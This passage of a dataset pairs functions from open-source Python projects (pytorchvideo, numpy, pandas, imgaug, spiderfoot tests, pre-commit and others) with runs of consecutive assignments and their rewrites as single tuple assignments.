                start_sec,
                self._video_time_base,
                self._video_start_pts,
                round_mode=""ceil"",
            )
            video_end_pts = secs_to_pts(
                end_sec,
                self._video_time_base,
                self._video_start_pts,
                round_mode=""ceil"",
            )

            video_frames = [
                f
                for f, pts in self._video
                if pts >= video_start_pts and pts < video_end_pts
            ]

        audio_samples = None
        if self._has_audio and self._audio is not None:
            audio_start_pts = secs_to_pts(
                start_sec,
                self._audio_time_base,
                self._audio_start_pts,
                round_mode=""ceil"",
            )
            audio_end_pts = secs_to_pts(
                end_sec,
                self._audio_time_base,
                self._audio_start_pts,
                round_mode=""ceil"",
            )
            audio_samples = [
                f
                for f, pts in self._audio
                if pts >= audio_start_pts and pts < audio_end_pts
            ]
            audio_samples = torch.cat(audio_samples, axis=0)
            audio_samples = audio_samples.to(torch.float32)

        if video_frames is None or len(video_frames) == 0:
            logger.debug(
                f""No video found within {start_sec} and {end_sec} seconds. ""
                f""Video starts at time 0 and ends at {self.duration}.""
            )

            video_frames = None

        if video_frames is not None:
            video_frames = thwc_to_cthw(torch.stack(video_frames)).to(torch.float32)

        return {
            ""video"": video_frames,
            ""audio"": audio_samples,
        }","video_start_pts = secs_to_pts(start_sec, self._video_time_base, self._video_start_pts, round_mode='ceil')
video_end_pts = secs_to_pts(end_sec, self._video_time_base, self._video_start_pts, round_mode='ceil')","video_start_pts , video_end_pts  = secs_to_pts(start_sec, self._video_time_base, self._video_start_pts, round_mode='ceil'), secs_to_pts(end_sec, self._video_time_base, self._video_start_pts, round_mode='ceil')"
pytorchvideo,https://github.com/facebookresearch/pytorchvideo/tree/master/pytorchvideo/data/encoded_video_pyav.py,EncodedVideoPyAV,get_clip$151,"def get_clip(
        self, start_sec: float, end_sec: float
    ) -> Dict[str, Optional[torch.Tensor]]:
        """"""
        Retrieves frames from the encoded video at the specified start and end times
        in seconds (the video always starts at 0 seconds). Returned frames will be in
        [start_sec, end_sec). Note that 1) if you want to avoid float precision issue
        and need accurate frames, please use Fraction for start_sec and end_sec.
        2) As end_sec is exclusive, so you may need to use
        `get_clip(start_sec, duration + EPS)` to get the last frame.

        Args:
            start_sec (float): the clip start time in seconds
            end_sec (float): the clip end time in seconds
        Returns:
            clip_data:
                A dictionary mapping the entries at ""video"" and ""audio"" to a tensors.

                ""video"": A tensor of the clip's RGB frames with shape:
                (channel, time, height, width). The frames are of type torch.float32 and
                in the range [0 - 255].

                ""audio"": A tensor of the clip's audio samples with shape:
                (samples). The samples are of type torch.float32 and
                in the range [0 - 255].

            Returns None if no video or audio found within time range.

        """"""
        if self._selective_decoding:
            self._video, self._audio = self._pyav_decode_video(start_sec, end_sec)

        video_frames = None
        if self._video is not None:
            video_start_pts = secs_to_pts(
                start_sec,
                self._video_time_base,
                self._video_start_pts,
                round_mode=""ceil"",
            )
            video_end_pts = secs_to_pts(
                end_sec,
                self._video_time_base,
                self._video_start_pts,
                round_mode=""ceil"",
            )

            video_frames = [
                f
                for f, pts in self._video
                if pts >= video_start_pts and pts < video_end_pts
            ]

        audio_samples = None
        if self._has_audio and self._audio is not None:
            audio_start_pts = secs_to_pts(
                start_sec,
                self._audio_time_base,
                self._audio_start_pts,
                round_mode=""ceil"",
            )
            audio_end_pts = secs_to_pts(
                end_sec,
                self._audio_time_base,
                self._audio_start_pts,
                round_mode=""ceil"",
            )
            audio_samples = [
                f
                for f, pts in self._audio
                if pts >= audio_start_pts and pts < audio_end_pts
            ]
            audio_samples = torch.cat(audio_samples, axis=0)
            audio_samples = audio_samples.to(torch.float32)

        if video_frames is None or len(video_frames) == 0:
            logger.debug(
                f""No video found within {start_sec} and {end_sec} seconds. ""
                f""Video starts at time 0 and ends at {self.duration}.""
            )

            video_frames = None

        if video_frames is not None:
            video_frames = thwc_to_cthw(torch.stack(video_frames)).to(torch.float32)

        return {
            ""video"": video_frames,
            ""audio"": audio_samples,
        }","audio_start_pts = secs_to_pts(start_sec, self._audio_time_base, self._audio_start_pts, round_mode='ceil')
audio_end_pts = secs_to_pts(end_sec, self._audio_time_base, self._audio_start_pts, round_mode='ceil')","audio_start_pts , audio_end_pts  = secs_to_pts(start_sec, self._audio_time_base, self._audio_start_pts, round_mode='ceil'), secs_to_pts(end_sec, self._audio_time_base, self._audio_start_pts, round_mode='ceil')"
numpy,https://github.com/numpy/numpy/tree/master/numpy/core/tests/test_numeric.py,TestClip,test_array_double$1906,"def test_array_double(self):
        # Test native double input with array min/max.
        a = self._generate_data(self.nr, self.nc)
        m = np.zeros(a.shape)
        M = m + 0.5
        ac = self.fastclip(a, m, M)
        act = self.clip(a, m, M)
        assert_array_strict_equal(ac, act)","ac = self.fastclip(a, m, M)
act = self.clip(a, m, M)","ac , act  = self.fastclip(a, m, M), self.clip(a, m, M)"
freemocap,https://github.com/jonmatthis/freemocap/tree/master/freemocap/fmc_anipose.py,CameraGroup,_initialize_params_triangulation_possible$1456,"def _initialize_params_triangulation_possible(self, p3ds, p2ds, **kwargs):
        # initialize params using above function
        # initialize alphas to 1 for first one and 0 for other possible

        n_cams, n_frames, n_joints, n_possible, _ = p2ds.shape
        good = ~np.isnan(p2ds[:, :, :, :, 0])

        alphas = np.zeros((n_cams, n_frames, n_joints, n_possible), dtype=""float64"")
        alphas[:, :, :, 0] = 0

        params = self._initialize_params_triangulation(p3ds, **kwargs)
        params_full = np.hstack([params, alphas[good]])

        return params_full","good = ~np.isnan(p2ds[:, :, :, :, 0])
alphas = np.zeros((n_cams, n_frames, n_joints, n_possible), dtype='float64')","good , alphas  = ~np.isnan(p2ds[:, :, :, :, 0]), np.zeros((n_cams, n_frames, n_joints, n_possible), dtype='float64')"
freemocap,https://github.com/jonmatthis/freemocap/tree/master/freemocap/fmc_anipose.py,CameraGroup,_initialize_params_triangulation_possible$1456,"def _initialize_params_triangulation_possible(self, p3ds, p2ds, **kwargs):
        # initialize params using above function
        # initialize alphas to 1 for first one and 0 for other possible

        n_cams, n_frames, n_joints, n_possible, _ = p2ds.shape
        good = ~np.isnan(p2ds[:, :, :, :, 0])

        alphas = np.zeros((n_cams, n_frames, n_joints, n_possible), dtype=""float64"")
        alphas[:, :, :, 0] = 0

        params = self._initialize_params_triangulation(p3ds, **kwargs)
        params_full = np.hstack([params, alphas[good]])

        return params_full","alphas[:, :, :, 0] = 0
params = self._initialize_params_triangulation(p3ds, **kwargs)","alphas[:, :, :, 0] , params  = 0, self._initialize_params_triangulation(p3ds, **kwargs)"
nltk,https://github.com/nltk/nltk/tree/master/nltk/test/unit/test_util.py,,test_everygrams_without_padding$12,"def test_everygrams_without_padding(everygram_input):
    expected_output = [
        (""a"",),
        (""a"", ""b""),
        (""a"", ""b"", ""c""),
        (""b"",),
        (""b"", ""c""),
        (""c"",),
    ]
    output = list(everygrams(everygram_input))
    assert output == expected_output","expected_output = [('a',), ('a', 'b'), ('a', 'b', 'c'), ('b',), ('b', 'c'), ('c',)]
output = list(everygrams(everygram_input))","expected_output , output  = [('a',), ('a', 'b'), ('a', 'b', 'c'), ('b',), ('b', 'c'), ('c',)], list(everygrams(everygram_input))"
spiderfoot,https://github.com/smicallef/spiderfoot/tree/master/test/unit/modules/test_sfp_ipregistry.py,TestModuletemplate,test_handleEvent_no_api_key_should_set_errorState$37,"def test_handleEvent_no_api_key_should_set_errorState(self):
        """"""
        Test handleEvent(self, event)
        """"""
        sf = SpiderFoot(self.default_options)

        module = sfp_ipregistry()
        module.setup(sf, dict())

        target_value = ""example target value""
        target_type = ""IP_ADDRESS""
        target = SpiderFootTarget(target_value, target_type)
        module.setTarget(target)

        event_type = ""ROOT""
        event_data = ""example data""
        event_module = """"
        source_event = """"
        evt = SpiderFootEvent(event_type, event_data, event_module, source_event)

        result = module.handleEvent(evt)

        self.assertIsNone(result)
        self.assertTrue(module.errorState)","sf = SpiderFoot(self.default_options)
module = sfp_ipregistry()","sf , module  = SpiderFoot(self.default_options), sfp_ipregistry()"
spiderfoot,https://github.com/smicallef/spiderfoot/tree/master/test/unit/modules/test_sfp_ipregistry.py,TestModuletemplate,test_handleEvent_no_api_key_should_set_errorState$37,"def test_handleEvent_no_api_key_should_set_errorState(self):
        """"""
        Test handleEvent(self, event)
        """"""
        sf = SpiderFoot(self.default_options)

        module = sfp_ipregistry()
        module.setup(sf, dict())

        target_value = ""example target value""
        target_type = ""IP_ADDRESS""
        target = SpiderFootTarget(target_value, target_type)
        module.setTarget(target)

        event_type = ""ROOT""
        event_data = ""example data""
        event_module = """"
        source_event = """"
        evt = SpiderFootEvent(event_type, event_data, event_module, source_event)

        result = module.handleEvent(evt)

        self.assertIsNone(result)
        self.assertTrue(module.errorState)","target_value = 'example target value'
target_type = 'IP_ADDRESS'","target_value , target_type  = 'example target value', 'IP_ADDRESS'"
spiderfoot,https://github.com/smicallef/spiderfoot/tree/master/test/unit/modules/test_sfp_ipregistry.py,TestModuletemplate,test_handleEvent_no_api_key_should_set_errorState$37,"def test_handleEvent_no_api_key_should_set_errorState(self):
        """"""
        Test handleEvent(self, event)
        """"""
        sf = SpiderFoot(self.default_options)

        module = sfp_ipregistry()
        module.setup(sf, dict())

        target_value = ""example target value""
        target_type = ""IP_ADDRESS""
        target = SpiderFootTarget(target_value, target_type)
        module.setTarget(target)

        event_type = ""ROOT""
        event_data = ""example data""
        event_module = """"
        source_event = """"
        evt = SpiderFootEvent(event_type, event_data, event_module, source_event)

        result = module.handleEvent(evt)

        self.assertIsNone(result)
        self.assertTrue(module.errorState)","event_type = 'ROOT'
event_data = 'example data'
event_module = ''
source_event = ''","event_type , event_data , event_module , source_event  = 'ROOT', 'example data', '', ''"
unmanic,https://github.com/Unmanic/unmanic/tree/master/unmanic/libs/installation_link.py,RemoteTaskManager,__set_current_task$810,"def __set_current_task(self, current_task):
        """"""Sets the given task to the worker class""""""
        self.current_task = current_task
        self.worker_log = []","self.current_task = current_task
self.worker_log = []","self.current_task , self.worker_log  = current_task, []"
graphene-sqlalchemy,https://github.com/graphql-python/graphene-sqlalchemy/tree/master/graphene_sqlalchemy/converter.py,,dynamic_type$75,"def dynamic_type():
        """""":rtype: Field|None""""""
        direction = relationship_prop.direction
        child_type = obj_type._meta.registry.get_type_for_model(
            relationship_prop.mapper.entity
        )
        batching_ = batching if is_selectin_available else False

        if not child_type:
            return None

        if direction == interfaces.MANYTOONE or not relationship_prop.uselist:
            return _convert_o2o_or_m2o_relationship(
                relationship_prop, obj_type, batching_, orm_field_name, **field_kwargs
            )

        if direction in (interfaces.ONETOMANY, interfaces.MANYTOMANY):
            return _convert_o2m_or_m2m_relationship(
                relationship_prop,
                obj_type,
                batching_,
                connection_field_factory,
                **field_kwargs,
            )","direction = relationship_prop.direction
child_type = obj_type._meta.registry.get_type_for_model(relationship_prop.mapper.entity)
batching_ = batching if is_selectin_available else False","direction , child_type , batching_  = relationship_prop.direction, obj_type._meta.registry.get_type_for_model(relationship_prop.mapper.entity), batching if is_selectin_available else False"
imgaug,https://github.com/aleju/imgaug/tree/master/test/augmenters/test_segmentation.py,TestRegularGridVoronoi,test___init___$874,"def test___init___(self):
        rs = iarandom.RNG(10)

        mock_voronoi = mock.MagicMock()
        mock_voronoi.return_value = mock_voronoi
        fname = ""imgaug.augmenters.segmentation.Voronoi.__init__""
        with mock.patch(fname, mock_voronoi):
            _ = iaa.RegularGridVoronoi(
                10,
                20,
                p_drop_points=0.6,
                p_replace=0.5,
                max_size=5,
                interpolation=""cubic"",
                seed=rs,
                name=""foo""
            )

        assert mock_voronoi.call_count == 1
        ps = mock_voronoi.call_args_list[0][1][""points_sampler""]
        assert isinstance(ps, iaa.DropoutPointsSampler)
        assert isinstance(ps.other_points_sampler,
                          iaa.RegularGridPointsSampler)
        assert np.isclose(ps.p_drop.p.value, 1-0.6)
        assert ps.other_points_sampler.n_rows.value == 10
        assert ps.other_points_sampler.n_cols.value == 20
        assert np.isclose(mock_voronoi.call_args_list[0][1][""p_replace""],
                          0.5)
        assert mock_voronoi.call_args_list[0][1][""max_size""] == 5
        assert mock_voronoi.call_args_list[0][1][""interpolation""] == ""cubic""
        assert mock_voronoi.call_args_list[0][1][""name""] == ""foo""
        assert mock_voronoi.call_args_list[0][1][""seed""] is rs","rs = iarandom.RNG(10)
mock_voronoi = mock.MagicMock()","rs , mock_voronoi  = iarandom.RNG(10), mock.MagicMock()"
imgaug,https://github.com/aleju/imgaug/tree/master/test/augmenters/test_segmentation.py,TestRegularGridVoronoi,test___init___$874,"def test___init___(self):
        rs = iarandom.RNG(10)

        mock_voronoi = mock.MagicMock()
        mock_voronoi.return_value = mock_voronoi
        fname = ""imgaug.augmenters.segmentation.Voronoi.__init__""
        with mock.patch(fname, mock_voronoi):
            _ = iaa.RegularGridVoronoi(
                10,
                20,
                p_drop_points=0.6,
                p_replace=0.5,
                max_size=5,
                interpolation=""cubic"",
                seed=rs,
                name=""foo""
            )

        assert mock_voronoi.call_count == 1
        ps = mock_voronoi.call_args_list[0][1][""points_sampler""]
        assert isinstance(ps, iaa.DropoutPointsSampler)
        assert isinstance(ps.other_points_sampler,
                          iaa.RegularGridPointsSampler)
        assert np.isclose(ps.p_drop.p.value, 1-0.6)
        assert ps.other_points_sampler.n_rows.value == 10
        assert ps.other_points_sampler.n_cols.value == 20
        assert np.isclose(mock_voronoi.call_args_list[0][1][""p_replace""],
                          0.5)
        assert mock_voronoi.call_args_list[0][1][""max_size""] == 5
        assert mock_voronoi.call_args_list[0][1][""interpolation""] == ""cubic""
        assert mock_voronoi.call_args_list[0][1][""name""] == ""foo""
        assert mock_voronoi.call_args_list[0][1][""seed""] is rs","mock_voronoi.return_value = mock_voronoi
fname = 'imgaug.augmenters.segmentation.Voronoi.__init__'","mock_voronoi.return_value , fname  = mock_voronoi, 'imgaug.augmenters.segmentation.Voronoi.__init__'"
imgaug,https://github.com/aleju/imgaug/tree/master/test/augmenters/test_size.py,TestPad,test_pad_keypoints_by_floats_with_keep_size$2687,"def test_pad_keypoints_by_floats_with_keep_size(self):
        aug = iaa.Pad(percent=(0.5, 0, 1.0, 1.0), keep_size=True)
        kps = [ia.Keypoint(x=1, y=2), ia.Keypoint(x=3, y=0)]
        kpsoi = ia.KeypointsOnImage(kps, shape=(4, 4, 3))
        kpsoi_aug = aug.augment_keypoints([kpsoi])[0]
        assert kpsoi_aug.shape == (4, 4, 3)
        assert len(kpsoi_aug.keypoints) == 2
        assert np.allclose(kpsoi_aug.keypoints[0].x, ((4+1)/8)*4)
        assert np.allclose(kpsoi_aug.keypoints[0].y, ((2+2)/10)*4)
        assert np.allclose(kpsoi_aug.keypoints[1].x, ((4+3)/8)*4)
        assert np.allclose(kpsoi_aug.keypoints[1].y, ((2+0)/10)*4)","aug = iaa.Pad(percent=(0.5, 0, 1.0, 1.0), keep_size=True)
kps = [ia.Keypoint(x=1, y=2), ia.Keypoint(x=3, y=0)]","aug , kps  = iaa.Pad(percent=(0.5, 0, 1.0, 1.0), keep_size=True), [ia.Keypoint(x=1, y=2), ia.Keypoint(x=3, y=0)]"
videos,https://github.com/3b1b/videos/tree/master/_2019/clacks/solution2/position_phase_space.py,ShowMomentumConservation,rearrange_for_slope$1845,"def rearrange_for_slope(self):
        eqs = VGroup(*reversed(self.axes.labels)).copy()
        y_eq, x_eq = eqs
        for eq in eqs:
            point = VectorizedPoint(eq[1].get_center())
            eq.submobjects.insert(1, point)
            eq.submobjects[3] = eq[3].submobjects[0]
            eq.generate_target()
        eqs_targets = VGroup(*[eq.target for eq in eqs])

        new_eqs = VGroup(
            Tex(""{y"", ""\\over"", ""\\sqrt{m_2}}"", ""="", ""d_2""),
            Tex(""{x"", ""\\over"", ""\\sqrt{m_1}}"", ""="", ""d_1""),
        )
        new_x_eq, new_y_eq = new_eqs
        # Shuffle to align with x_eq and y_eq
        for new_eq in new_eqs:
            new_eq[2][2:].set_color(BLUE)
            new_eq.submobjects = [new_eq[i] for i in [0, 1, 3, 2, 4]]

        eqs_targets.arrange(DOWN, buff=LARGE_BUFF)
        eqs_targets.move_to(RIGHT).to_edge(UP)
        for eq, new_eq in zip(eqs_targets, new_eqs):
            new_eq.move_to(eq)

        self.play(LaggedStartMap(MoveToTarget, eqs, lag_ratio=0.7))
        self.play(*[
            Transform(
                eq, new_eq,
                path_arc=-90 * DEGREES,
            )
            for eq, new_eq in zip(eqs, new_eqs)
        ])
        self.wait()

        # Shuffle back
        for eq in eqs:
            eq[2][2:].set_color(BLUE)
            eq.submobjects = [eq[i] for i in [0, 1, 3, 2, 4]]

        # Set equal
        equals = Tex(""="")
        for eq in eqs:
            eq.generate_target()
        VGroup(
            x_eq.target[4],
            x_eq.target[3],
            x_eq.target[:3],
        ).arrange(RIGHT)
        for p1, p2 in zip(x_eq, x_eq.target):
            p2.align_to(p1, DOWN)
        group = VGroup(y_eq.target, equals, x_eq.target)
        group.arrange(RIGHT)
        x_eq.target.align_to(y_eq.target, DOWN)
        equals.align_to(y_eq.target[3], DOWN)
        group.to_edge(UP, buff=MED_SMALL_BUFF)
        group.to_edge(RIGHT, buff=3)

        self.play(
            MoveToTarget(y_eq),
            MoveToTarget(x_eq, path_arc=90 * DEGREES),
            GrowFromCenter(equals)
        )
        self.wait()

        # Simplify
        final_eq = Tex(
            ""y"", ""="",
            ""{\\sqrt{m_2}"", ""\\over"", ""\\sqrt{m_1}}"",
            ""x"",
        )
        for part in final_eq.get_parts_by_tex(""sqrt""):
            part[2:].set_color(BLUE)
        m_part = final_eq[2:5]

        final_eq.next_to(group, DOWN)
        final_eq.shift(0.4 * UP)
        movers = VGroup(
            y_eq[0], equals.submobjects[0],
            y_eq[2], y_eq[1], x_eq[2],
            x_eq[0]
        ).copy()
        for mover, part in zip(movers, final_eq):
            mover.target = part
        self.play(
            LaggedStartMap(
                MoveToTarget, movers,
                path_arc=30 * DEGREES,
                lag_ratio=0.9
            ),
            VGroup(x_eq, equals, y_eq).scale,
            0.7, {""about_edge"": UP},
        )
        self.remove(movers)
        self.add(final_eq)
        self.wait()

        # Highlight slope
        flash_line = self.d1_eq_d2_line.copy()
        flash_line.set_stroke(YELLOW, 5)
        self.play(ShowPassingFlash(flash_line))
        self.play(ShowCreationThenFadeAround(m_part))
        self.wait()

        # Tuck away slope in mind
        slope = m_part.copy()
        slope.generate_target()
        randy = Randolph(height=1.5)
        randy.next_to(final_eq, LEFT, MED_SMALL_BUFF)
        randy.align_to(self.d2_eq_w2_line, DOWN)
        bubble = ThoughtBubble(
            height=1.3, width=1.3, direction=RIGHT,
        )
        bubble.pin_to(randy)
        slope.target.scale(0.5)
        slope.target.move_to(bubble.get_bubble_center())
        randy.change(""pondering"", slope.target)
        randy.save_state()
        randy.change(""plane"")
        randy.fade(1)

        self.play(
            Restore(randy),
            Write(bubble),
            MoveToTarget(slope)
        )
        self.play(Blink(randy))

        self.thinking_on_slope_group = VGroup(
            randy, bubble, slope,
        )

        self.to_fade = VGroup(
            eqs, equals, final_eq,
            self.thinking_on_slope_group,
            self.xy_group,
        )","eqs_targets = VGroup(*[eq.target for eq in eqs])
new_eqs = VGroup(Tex('{y', '\\over', '\\sqrt{m_2}}', '=', 'd_2'), Tex('{x', '\\over', '\\sqrt{m_1}}', '=', 'd_1'))","eqs_targets , new_eqs  = VGroup(*[eq.target for eq in eqs]), VGroup(Tex('{y', '\\over', '\\sqrt{m_2}}', '=', 'd_2'), Tex('{x', '\\over', '\\sqrt{m_1}}', '=', 'd_1'))"
django-cms,https://github.com/django-cms/django-cms/tree/master/cms/management/commands/subcommands/delete_orphaned_plugins.py,DeleteOrphanedPluginsCommand,handle$12,"def handle(self, *args, **options):
        """"""
        Obtains a plugin report -
        cms.management.commands.subcommands.list.plugin_report - and uses it
        to delete orphaned plugins from the database, i.e. ones that are no
        longer installed, and ones that have no corresponding saved plugin
        instances (as will happen if a plugin is inserted into a placeholder,
        but not saved).
        """"""
        self.stdout.write('Obtaining plugin report\n')
        uninstalled_instances = []
        unsaved_instances = []

        for plugin in plugin_report():
            if not plugin['model']:
                for instance in plugin['instances']:
                    uninstalled_instances.append(instance)

            for instance in plugin['unsaved_instances']:
                unsaved_instances.append(instance)

        if options.get('interactive'):
            confirm = input(""""""
You have requested to delete any instances of uninstalled plugins and empty plugin instances.
There are %d uninstalled plugins and %d empty plugins.
Are you sure you want to do this?
Type 'yes' to continue, or 'no' to cancel: """""" % (len(uninstalled_instances), len(unsaved_instances)))
        else:
            confirm = 'yes'

        if confirm == 'yes':
            # delete items whose plugin is uninstalled and items with unsaved instances
            self.stdout.write('... deleting any instances of uninstalled plugins and empty plugin instances\n')

            for instance in uninstalled_instances:
                instance.delete()

            for instance in unsaved_instances:
                instance.delete()

            self.stdout.write('Deleted instances of: \n    %s uninstalled plugins  \n    %s plugins with unsaved instances\n' % (len(uninstalled_instances), len(unsaved_instances)))
            self.stdout.write('all done\n')","uninstalled_instances = []
unsaved_instances = []","uninstalled_instances , unsaved_instances  = [], []"
pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/frame/methods/test_replace.py,TestDataFrameReplace,test_replace_with_duplicate_columns$1344,"def test_replace_with_duplicate_columns(self, replacement):
        # GH 24798
        result = DataFrame({""A"": [1, 2, 3], ""A1"": [4, 5, 6], ""B"": [7, 8, 9]})
        result.columns = list(""AAB"")

        expected = DataFrame(
            {""A"": [1, 2, 3], ""A1"": [4, 5, 6], ""B"": [replacement, 8, 9]}
        )
        expected.columns = list(""AAB"")

        result[""B""] = result[""B""].replace(7, replacement)

        tm.assert_frame_equal(result, expected)","result.columns = list('AAB')
expected = DataFrame({'A': [1, 2, 3], 'A1': [4, 5, 6], 'B': [replacement, 8, 9]})","result.columns , expected  = list('AAB'), DataFrame({'A': [1, 2, 3], 'A1': [4, 5, 6], 'B': [replacement, 8, 9]})"
pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/frame/methods/test_replace.py,TestDataFrameReplace,test_replace_with_duplicate_columns$1344,"def test_replace_with_duplicate_columns(self, replacement):
        # GH 24798
        result = DataFrame({""A"": [1, 2, 3], ""A1"": [4, 5, 6], ""B"": [7, 8, 9]})
        result.columns = list(""AAB"")

        expected = DataFrame(
            {""A"": [1, 2, 3], ""A1"": [4, 5, 6], ""B"": [replacement, 8, 9]}
        )
        expected.columns = list(""AAB"")

        result[""B""] = result[""B""].replace(7, replacement)

        tm.assert_frame_equal(result, expected)","expected.columns = list('AAB')
result['B'] = result['B'].replace(7, replacement)","expected.columns , result['B']  = list('AAB'), result['B'].replace(7, replacement)"
DeepGBM,https://github.com/motefly/DeepGBM/tree/master/models/deepgbm.py,DeepGBM,forward$55,"def forward(self, Xg, Xd):
        Xd = Xd.long()
        if self.num_model == 'gbdt2nn':
            gbdt2nn_out, gbdt2nn_pred = self.gbdt2nn(Xg)
        elif self.num_model == 'gbdt':
            gbdt2nn_out = Xg.float()
            gbdt2nn_pred = None
        else:
            gbdt2nn_out = self.gbdt2nn(Xg)
            gbdt2nn_pred = None
        deepfm_out = self.deepfm(Xd)

        if self.num_model != 'gbdt2nn':
            alpha = self.alpha+0.5
            beta = self.beta+0.5
        else:
            alpha = self.alpha+1
            beta = self.beta
        out = alpha * gbdt2nn_out.view(-1) + beta * deepfm_out.view(-1)
        if self.task != 'regression':
            return nn.Sigmoid()(out), gbdt2nn_pred
        return out, gbdt2nn_pred","alpha = self.alpha + 0.5
beta = self.beta + 0.5","alpha , beta  = self.alpha + 0.5, self.beta + 0.5"
DeepGBM,https://github.com/motefly/DeepGBM/tree/master/models/deepgbm.py,DeepGBM,forward$55,"def forward(self, Xg, Xd):
        Xd = Xd.long()
        if self.num_model == 'gbdt2nn':
            gbdt2nn_out, gbdt2nn_pred = self.gbdt2nn(Xg)
        elif self.num_model == 'gbdt':
            gbdt2nn_out = Xg.float()
            gbdt2nn_pred = None
        else:
            gbdt2nn_out = self.gbdt2nn(Xg)
            gbdt2nn_pred = None
        deepfm_out = self.deepfm(Xd)

        if self.num_model != 'gbdt2nn':
            alpha = self.alpha+0.5
            beta = self.beta+0.5
        else:
            alpha = self.alpha+1
            beta = self.beta
        out = alpha * gbdt2nn_out.view(-1) + beta * deepfm_out.view(-1)
        if self.task != 'regression':
            return nn.Sigmoid()(out), gbdt2nn_pred
        return out, gbdt2nn_pred","gbdt2nn_out = Xg.float()
gbdt2nn_pred = None","gbdt2nn_out , gbdt2nn_pred  = Xg.float(), None"
imgaug,https://github.com/aleju/imgaug/tree/master/test/augmenters/test_geometric.py,TestWithPolarWarping,test_heatmaps_translation_x$9105,"def test_heatmaps_translation_x(self):
        hm = np.zeros((50, 70, 2), dtype=np.float32)
        hm[20-1:20+1, 30-1:30+1, 0] = 1.0
        hm[30-1:30+1, 40-1:40+1, 1] = 1.0
        hm = ia.HeatmapsOnImage(hm, shape=(50, 70, 3))
        aug = iaa.WithPolarWarping(iaa.Affine(translate_px={""x"": 15}))

        hm_aug = aug(heatmaps=hm)

        hm_aug_arr = hm_aug.get_arr()
        x1 = np.argmax(np.max(hm_aug_arr[..., 0], axis=0))
        y1 = np.argmax(np.max(hm_aug_arr[..., 0], axis=1))
        x2 = np.argmax(np.max(hm_aug_arr[..., 1], axis=0))
        y2 = np.argmax(np.max(hm_aug_arr[..., 1], axis=1))

        # translation on x axis in polar representation should move all points
        # a bit away from the center
        min_diff = 4
        assert hm_aug_arr.shape == (50, 70, 2)
        assert hm_aug.shape == (50, 70, 3)
        assert x1 < 30 - min_diff
        assert y1 < 20 - min_diff
        assert x2 > 40 + min_diff
        assert y2 > 30 + min_diff","hm[20 - 1:20 + 1, 30 - 1:30 + 1, 0] = 1.0
hm[30 - 1:30 + 1, 40 - 1:40 + 1, 1] = 1.0","hm[20 - 1:20 + 1, 30 - 1:30 + 1, 0] , hm[30 - 1:30 + 1, 40 - 1:40 + 1, 1]  = 1.0, 1.0"
imgaug,https://github.com/aleju/imgaug/tree/master/test/augmenters/test_geometric.py,TestWithPolarWarping,test_heatmaps_translation_x$9105,"def test_heatmaps_translation_x(self):
        hm = np.zeros((50, 70, 2), dtype=np.float32)
        hm[20-1:20+1, 30-1:30+1, 0] = 1.0
        hm[30-1:30+1, 40-1:40+1, 1] = 1.0
        hm = ia.HeatmapsOnImage(hm, shape=(50, 70, 3))
        aug = iaa.WithPolarWarping(iaa.Affine(translate_px={""x"": 15}))

        hm_aug = aug(heatmaps=hm)

        hm_aug_arr = hm_aug.get_arr()
        x1 = np.argmax(np.max(hm_aug_arr[..., 0], axis=0))
        y1 = np.argmax(np.max(hm_aug_arr[..., 0], axis=1))
        x2 = np.argmax(np.max(hm_aug_arr[..., 1], axis=0))
        y2 = np.argmax(np.max(hm_aug_arr[..., 1], axis=1))

        # translation on x axis in polar representation should move all points
        # a bit away from the center
        min_diff = 4
        assert hm_aug_arr.shape == (50, 70, 2)
        assert hm_aug.shape == (50, 70, 3)
        assert x1 < 30 - min_diff
        assert y1 < 20 - min_diff
        assert x2 > 40 + min_diff
        assert y2 > 30 + min_diff","hm = ia.HeatmapsOnImage(hm, shape=(50, 70, 3))
aug = iaa.WithPolarWarping(iaa.Affine(translate_px={'x': 15}))","hm , aug  = ia.HeatmapsOnImage(hm, shape=(50, 70, 3)), iaa.WithPolarWarping(iaa.Affine(translate_px={'x': 15}))"
imgaug,https://github.com/aleju/imgaug/tree/master/test/augmenters/test_geometric.py,TestWithPolarWarping,test_heatmaps_translation_x$9105,"def test_heatmaps_translation_x(self):
        hm = np.zeros((50, 70, 2), dtype=np.float32)
        hm[20-1:20+1, 30-1:30+1, 0] = 1.0
        hm[30-1:30+1, 40-1:40+1, 1] = 1.0
        hm = ia.HeatmapsOnImage(hm, shape=(50, 70, 3))
        aug = iaa.WithPolarWarping(iaa.Affine(translate_px={""x"": 15}))

        hm_aug = aug(heatmaps=hm)

        hm_aug_arr = hm_aug.get_arr()
        x1 = np.argmax(np.max(hm_aug_arr[..., 0], axis=0))
        y1 = np.argmax(np.max(hm_aug_arr[..., 0], axis=1))
        x2 = np.argmax(np.max(hm_aug_arr[..., 1], axis=0))
        y2 = np.argmax(np.max(hm_aug_arr[..., 1], axis=1))

        # translation on x axis in polar representation should move all points
        # a bit away from the center
        min_diff = 4
        assert hm_aug_arr.shape == (50, 70, 2)
        assert hm_aug.shape == (50, 70, 3)
        assert x1 < 30 - min_diff
        assert y1 < 20 - min_diff
        assert x2 > 40 + min_diff
        assert y2 > 30 + min_diff","x1 = np.argmax(np.max(hm_aug_arr[..., 0], axis=0))
y1 = np.argmax(np.max(hm_aug_arr[..., 0], axis=1))
x2 = np.argmax(np.max(hm_aug_arr[..., 1], axis=0))
y2 = np.argmax(np.max(hm_aug_arr[..., 1], axis=1))
min_diff = 4","x1 , y1 , x2 , y2 , min_diff  = np.argmax(np.max(hm_aug_arr[..., 0], axis=0)), np.argmax(np.max(hm_aug_arr[..., 0], axis=1)), np.argmax(np.max(hm_aug_arr[..., 1], axis=0)), np.argmax(np.max(hm_aug_arr[..., 1], axis=1)), 4"
pre-commit,https://github.com/pre-commit/pre-commit/tree/master/tests/conftest.py,,prepare_commit_msg_repo$120,"def prepare_commit_msg_repo(tempdir_factory):
    path = git_dir(tempdir_factory)
    script_name = 'add_sign_off.sh'
    config = {
        'repo': 'local',
        'hooks': [{
            'id': 'add-signoff',
            'name': 'Add ""Signed off by:""',
            'entry': f'./{script_name}',
            'language': 'script',
            'stages': ['prepare-commit-msg'],
        }],
    }
    write_config(path, config)
    with cwd(path):
        with open(script_name, 'w') as script_file:
            script_file.write(
                '#!/usr/bin/env bash\n'
                'set -eu\n'
                'echo ""\nSigned off by: "" >> ""$1""\n',
            )
            make_executable(script_name)
        cmd_output('git', 'add', '.')
        git_commit(msg=prepare_commit_msg_repo.__name__)
        yield path","path = git_dir(tempdir_factory)
